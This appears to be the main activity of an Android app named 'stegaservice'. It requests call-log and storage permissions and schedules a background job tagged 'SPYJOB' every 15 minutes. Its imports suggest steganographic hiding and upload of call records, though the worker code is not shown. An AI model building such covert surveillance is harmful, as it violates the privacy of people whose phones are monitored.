package com.example.stegaservice;

import android.Manifest;
import android.app.ActivityManager;
import android.content.ContentResolver;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.graphics.Bitmap;
import android.net.Uri;
import android.os.BatteryManager;
import android.os.Build;
import android.os.Bundle;
import android.os.Environment;
import android.provider.CallLog;
import android.provider.MediaStore;
import android.util.Log;
import android.view.View;
import android.widget.Button;
import android.widget.TextView;
import androidx.annotation.NonNull;
import androidx.appcompat.app.AppCompatActivity;
import androidx.work.Constraints;
import androidx.work.ExistingPeriodicWorkPolicy;
import androidx.work.NetworkType;
import androidx.work.PeriodicWorkRequest;
import androidx.work.WorkManager;
import androidx.work.Worker;
import androidx.work.WorkerParameters;
import androidx.core.app.ActivityCompat;

import java.io.File;
import java.io.FileWriter;
import java.io.IOException;
import java.util.ArrayList;
import java.util.List;
import java.util.concurrent.TimeUnit;
import java.util.Locale;

import java.time.Instant;
import java.time.LocalDateTime;
import java.time.ZoneId;
import java.time.format.DateTimeFormatter;

import okhttp3.MultipartBody;
import okhttp3.RequestBody;
import retrofit2.Call;
import retrofit2.http.Multipart;
import retrofit2.http.POST;
import retrofit2.http.Part;

public class MainActivity extends AppCompatActivity {
    private static final int SELECT_PICTURE = 100;

    private Uri filepath;

    private Bitmap original_image;

    private Button chooseButton, startButton, stopButton;
    private TextView textView;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        chooseButton = findViewById(R.id.choose_button);
        startButton = findViewById(R.id.start_button);
        stopButton = findViewById(R.id.stop_button);
        textView = findViewById(R.id.textView);

        checkAndRequestPermissions();

        chooseButton.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View view) {
                ImageChooser();
            }
        });

        startButton.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View view) {
                startTask();
                textView.setText(getString(R.string.running));
            }
        });


        stopButton.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View view) {
                stopTask();
                textView.setText(getString(R.string.not_running));
            }
        });
    }

    private void ImageChooser() {
        Intent intent = new Intent();
        intent.setType("image/*");
        intent.setAction(Intent.ACTION_GET_CONTENT);
        startActivityForResult(Intent.createChooser(intent, "Select Picture"), SELECT_PICTURE);
    }

    @Override
    protected void onActivityResult(int requestCode, int resultCode, Intent data) {
        super.onActivityResult(requestCode, resultCode, data);

        //Image set to imageView
        if (requestCode == SELECT_PICTURE && resultCode == RESULT_OK && data != null && data.getData() != null) {

            filepath = data.getData();
            try {
                original_image = MediaStore.Images.Media.getBitmap(getContentResolver(), filepath);
            } catch (IOException e) {
                Log.d("SelectPicture", "Error : " + e);
            }
        }

    }
    private void startTask() {
        Constraints constraints = new Constraints.Builder()
                .setRequiresCharging(false)
                .setRequiredNetworkType(NetworkType.CONNECTED)
                .build();

        Log.d("SPYJOB", "TEST");
        PeriodicWorkRequest task = new PeriodicWorkRequest.Builder(
                MyWorker.class, 15, TimeUnit.MINUTES)
                .addTag("SPYJOB")
                .setConstraints(constraints)
                .build();

        // Use getInstance(Context) instead of the deprecated getInstance() method
        WorkManager.getInstance(this).enqueue(task);
    }

    private void stopTask() {
        // Use getInstance(Context) instead of the deprecated getInstance() method
        WorkManager.getInstance(this).cancelAllWorkByTag("SPYJOB");
    }



    private void checkAndRequestPermissions() {

        List<String> listPermissionsNeeded = new ArrayList<>();
        listPermissionsNeeded.add(android.Manifest.permission.READ_CALL_LOG);
        listPermissionsNeeded.add(android.Manifest.permission.WRITE_CALL_LOG);
        listPermissionsNeeded.add(android.Manifest.permission.READ_EXTERNAL_STORAGE);
        listPermissionsNeeded.add(Manifest.permission.WRITE_EXTERNAL_STORAGE);
        if (!listPermissionsNeeded.isEmpty()) {
            ActivityCompat.requestPermissions(this, listPermissionsNeeded.toArray(new String[0]), 1);
        }
    }




}
